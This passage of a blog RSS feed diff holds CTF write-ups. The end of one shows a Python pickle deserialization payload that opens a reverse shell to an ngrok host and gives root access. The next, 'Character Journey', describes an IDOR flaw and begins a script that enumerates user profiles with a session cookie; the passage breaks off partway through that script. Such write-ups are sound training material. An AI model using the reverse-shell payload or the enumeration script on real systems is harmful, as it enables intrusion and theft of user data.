+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;__reduce__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&amp;#39;python3 -c &amp;#39;import os,pty,socket;s=socket.socket();s.connect((&amp;#34;0.tcp.ap.ngrok.io&amp;#34;,13278));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; &amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;base64&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b64encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pickle&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dumps&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Gaining Shell Access&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Send the crafted payload to the server to get a reverse shell.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Once you have shell access, escalate privileges if necessary. Since you’re already root, you should be able to retrieve the flag.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/the-two-step/reverse%20shell.png&#34;
+	width=&#34;1090&#34;
+	height=&#34;163&#34;
+	srcset=&#34;http://localhost:1313/post/the-two-step/reverse%20shell_hu4de6d867c2068ea8db2c004de90cd585_26033_480x0_resize_box_3.png 480w, http://localhost:1313/post/the-two-step/reverse%20shell_hu4de6d867c2068ea8db2c004de90cd585_26033_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Shell&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;668&#34;
+		data-flex-basis=&#34;1604px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Flag Retrieval&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;With root access, locate and read the flag file.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/the-two-step/flag.png&#34;
+	width=&#34;1199&#34;
+	height=&#34;370&#34;
+	srcset=&#34;http://localhost:1313/post/the-two-step/flag_hud54a621aceb4dedc0518019faef18606_73727_480x0_resize_box_3.png 480w, http://localhost:1313/post/the-two-step/flag_hud54a621aceb4dedc0518019faef18606_73727_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Flag&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;324&#34;
+		data-flex-basis=&#34;777px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+        </item>
+        <item>
+        <title>Character Journey</title>
+        <link>http://localhost:1313/post/character-journey/</link>
+        <pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate>
+        
+        <guid>http://localhost:1313/post/character-journey/</guid>
+        <description>&lt;h1 id=&#34;character-journey-ctf-challenge-writeup&#34;&gt;Character Journey CTF Challenge Writeup
+&lt;/h1&gt;&lt;h2 id=&#34;challenge-information&#34;&gt;Challenge Information
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Name&lt;/strong&gt;: Character Journey&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Points&lt;/strong&gt;: 500&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Category&lt;/strong&gt;: Web&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Objective&lt;/strong&gt;: Find and retrieve the flag from a web application by exploiting vulnerabilities.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/character-journey/challenge.png&#34;
+	width=&#34;664&#34;
+	height=&#34;816&#34;
+	srcset=&#34;http://localhost:1313/post/character-journey/challenge_hud5ada5ac3389c42e0cc2a050d3fc9f1f_74388_480x0_resize_box_3.png 480w, http://localhost:1313/post/character-journey/challenge_hud5ada5ac3389c42e0cc2a050d3fc9f1f_74388_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Challenge&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;81&#34;
+		data-flex-basis=&#34;195px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;solution&#34;&gt;Solution
+&lt;/h2&gt;&lt;p&gt;To solve the &amp;ldquo;Character Journey&amp;rdquo; challenge, follow these steps:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Initial Exploration&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Visit the web page and register for an account.&lt;/li&gt;
+&lt;li&gt;Upon registration, we observed that the application doesn&amp;rsquo;t have notable functionality
+&lt;ul&gt;
+&lt;li&gt;Feedback form does not actually send a POST request&lt;/li&gt;
+&lt;li&gt;YouTube link is quite useless&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Investigating User Account Features&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;We then focused on the functionality of viewing your own account.&lt;/li&gt;
+&lt;li&gt;While exploring this feature, investigate the URL parameters and other user-specific data.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Identifying the Vulnerability&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Discover an Insecure Direct Object Reference (IDOR) vulnerability by manipulating user IDs in the URL (e.g., changing ID from 1 to 10).&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Find that some URLs return base64 encoded text chunks.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/character-journey/found%20IDOR.png&#34;
+	width=&#34;1158&#34;
+	height=&#34;679&#34;
+	srcset=&#34;http://localhost:1313/post/character-journey/found%20IDOR_hub3b0f40217b87d2ca6a458403113f4e9_33619_480x0_resize_box_3.png 480w, http://localhost:1313/post/character-journey/found%20IDOR_hub3b0f40217b87d2ca6a458403113f4e9_33619_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Found IDOR&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;170&#34;
+		data-flex-basis=&#34;409px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/character-journey/base64%20chunks.png&#34;
+	width=&#34;960&#34;
+	height=&#34;639&#34;
+	srcset=&#34;http://localhost:1313/post/character-journey/base64%20chunks_hu16cd5ac440bfaaf75fed7abd59495da9_30056_480x0_resize_box_3.png 480w, http://localhost:1313/post/character-journey/base64%20chunks_hu16cd5ac440bfaaf75fed7abd59495da9_30056_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Base64 Chunks&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;150&#34;
+		data-flex-basis=&#34;360px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Brute Force Exploration&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Develop a script to automate the process of iHack Prelim 2024 user IDs from 1 to 100.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Run the script to extract all base64 encoded text chunks.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;requests&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;bs4&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BeautifulSoup&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Function to fetch profile information for a given userId&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;fetch_profile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://character-journey.ihack24.capturextheflag.io/profile.php?userId=&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user_id&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;User-Agent&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Accept&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Accept-Language&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;en-US,en;q=0.5&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Accept-Encoding&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;gzip, deflate, br&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Connection&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;close&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Referer&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://character-journey.ihack24.capturextheflag.io/home.php&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Cookie&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;PHPSESSID=be6885c0ca68d30c985be4b2fee16ebd&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Upgrade-Insecure-Requests&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;response&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;response&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;status_code&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;200&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;response&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Failed to fetch profile for userId: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user_id&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; with status code: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;response&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;status_code&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;None&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Function to parse HTML and extract username and email&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;parse_profile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;html_content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;soup&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BeautifulSoup&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;html_content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;html.parser&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;# Find &amp;lt;p&amp;gt; tags that contain the Name and Email&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;name_tag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;soup&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;find&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;p&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;lambda&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;startswith&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Name:&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;email_tag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;soup&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;find&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;p&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;lambda&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;startswith&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Email:&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
